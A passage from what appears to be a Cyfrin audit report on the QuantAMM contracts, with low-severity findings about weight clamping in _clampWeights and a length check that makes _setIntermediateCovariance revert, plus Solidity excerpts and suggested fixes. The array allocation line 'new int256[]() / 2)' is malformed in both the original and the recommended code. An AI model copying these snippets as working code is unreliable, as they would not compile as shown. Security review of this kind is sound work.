            lastPossibleInterpolationTime: _lastInterpolationTimePossible,
            lastUpdateIntervalTime: uint40(block.timestamp)
        });

        emit WeightsUpdated(_poolAddress, _weights);
    }
```

## Impact

The `_weights.length` provided by `setWeightsManually` does not equal `_totalTokens * 2`, the require statement in `setWeights` will revert with the error message `"WLDL"`.
Even if `_weights.length == _totalTokens * 2`, the block multipliers portion may be uninitialized or invalid, leading to unintended results in weight and multiplier calculations.

## Tools Used

Manual Review

## Recommendations

Modify `setWeightsManually` to include both weights and block multipliers in `_weights`.

## <a id='L-11'></a>L-11. `_clampWeights` does not consider values equal to `absoluteMin` and `absoluteMax`

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Vulnerability Details

in the `_clampWeights`, a code fragment iterates over \_weights and applies a restriction based on absoluteMin and absoluteMax, which does not take into account values equal to them, but only those outside the range, but judging by the logic of the iteration itself, this is incorrect.

```Solidity
   function _clampWeights(
        int256[] memory _weights,
        int256 _absoluteWeightGuardRail
    ) internal pure returns (int256[] memory) {
        unchecked {
            uint weightLength = _weights.length;
            if (weightLength == 1) {
                return _weights;
            }
            int256 absoluteMin = _absoluteWeightGuardRail; 
            int256 absoluteMax = ONE -
                (PRBMathSD59x18.fromInt(int256(_weights.length - 1)).mul(_absoluteWeightGuardRail));
            int256 sumRemainerWeight = ONE;
            int256 sumOtherWeights;
            
            for (uint i; i < weightLength; ++i) {
                if (_weights[i] < absoluteMin) {
                    _weights[i] = absoluteMin;
                    sumRemainerWeight -= absoluteMin;
                } else if (_weights[i] > absoluteMax) {
                    _weights[i] = absoluteMax;
                    sumOtherWeights += absoluteMax;
                }
            } 
            if (sumOtherWeights != 0) {
                int256 proportionalRemainder = sumRemainerWeight.div(sumOtherWeights);
                for (uint i; i < weightLength; ++i) {
                    if (_weights[i] != absoluteMin) {
                        _weights[i] = _weights[i].mul(proportionalRemainder);
                    }
                }
            }
        }
        return _weights;
    }

```

Values less than absoluteMin are first set to absoluteMin and then subtracted from sumRemainerWeight. This implies that a value already equal to absoluteMin should also be subtracted.

Values greater than absoluteMax are set to absoluteMax and added to sumOtherWeights. This suggests that an existing value of absoluteMax should be added as well.

The code iterates through the `_weights` array and aims to apply boundaries based on `absoluteMin` and `absoluteMax`. The error is that it focuses only on values *outside* the range, overlooking weights already *at* the boundaries.

## Impact

The incorrect adjustments to sumRemainerWeight and sumOtherWeights directly lead to an imprecise weight distribution. This can skew the results of the algorithm, especially if there are multiple weights at the minimum or maximum values.

## Tools Used

Manual

## Recommendations

Use `<=` , `>=`

## <a id='L-12'></a>L-12. incorrect length check in `_setIntermediateCovariance` will DOS manual setting of `intermediateCovarianceStates` after pool initialization

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The UpdateWeightRunner provides a function (`setIntermediateValuesManually`) that allows the QuantAMM admin to manually set the intermediate variables of a rule, asides from setting the initial intermediate variables on pool initialization , it can also be used as a break-glass feature to set/reset the intermediate variables of a rule if necessary.
The issue is that the length check in the function `QuantAMMCovarianceBasedRule::_setIntermediateCovariance` function is incorrect and will prevent usage of this feature

## Vulnerability Details

In [`QuantAMMCovarianceBasedRule::_setIntermediateCovariance`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/rules/base/QuantammCovarianceBasedRule.sol#L132)

```solidity
    function _setIntermediateCovariance(
        address _poolAddress,
        int256[][] memory _initialValues,
        uint _numberOfAssets
    ) internal {
        uint storeLength = intermediateCovarianceStates[_poolAddress].length;
@>      if ((storeLength == 0 && _initialValues.length == _numberOfAssets) || _initialValues.length == storeLength) {
            for (uint i; i < _numberOfAssets; ) {
                require(_initialValues[i].length == _numberOfAssets, "Bad init covar row");
                unchecked {
                    ++i;
                }
            }
            if (storeLength == 0) {
                if ((_numberOfAssets * _numberOfAssets) % 2 == 0) {
                    intermediateCovarianceStates[_poolAddress] = new int256[]() / 2);
                } else {
                    intermediateCovarianceStates[_poolAddress] = new int256[](
                        (((_numberOfAssets * _numberOfAssets) - 1) / 2) + 1
                    );
                }
            }

            //should be initiiduring create pool
            _quantAMMPack128Matrix(_initialValues, intermediateCovarianceStates[_poolAddress]);
        } else {
            revert("Invalid set covariance");
        }
    }
```

The issue here is `_initialValues` is an n by n 2d array , where n is the number of assets, while `intermediateCovarianceStates` is a single array of length n\*n/2. This means that the function will always revert when `storeLength` is not 0(i.e. when pool is already initialized).

## Impact

Medium - QuantAMM Admin will be unable to manually set intermediate variables of Covariance based pools in scenarios where its is necessary to do so

## Tools Used

Manual Review

## Recommendations

```solidity
    function _setIntermediateCovariance(
        address _poolAddress,
        int256[][] memory _initialValues,
        uint _numberOfAssets
    ) internal {
        uint storeLength = intermediateCovarianceStates[_poolAddress].length;
@>      if ((storeLength == 0 && _initialValues.length == _numberOfAssets) || storeLength * 2 >= _initialValues.length * _initialValues.length) {
            for (uint i; i < _numberOfAssets; ) {
                require(_initialValues[i].length == _numberOfAssets, "Bad init covar row");
                unchecked {
                    ++i;
                }
            }
            if (storeLength == 0) {
                if ((_numberOfAssets * _numberOfAssets) % 2 == 0) {
                    intermediateCovarianceStates[_poolAddress] = new int256[]() / 2);
                } else {
                    intermediateCovarianceStates[_poolAddress] = new int256[](
                        (((_numberOfAssets * _numberOfAssets) - 1) / 2) + 1
                    );
                }
            }

            //should be initiiduring create pool
            _quantAMMPack128Matrix(_initialValues, intermediateCovarianceStates[_poolAddress]);
        } else {
            revert("Invalid set covariance");
        }
    }
```





    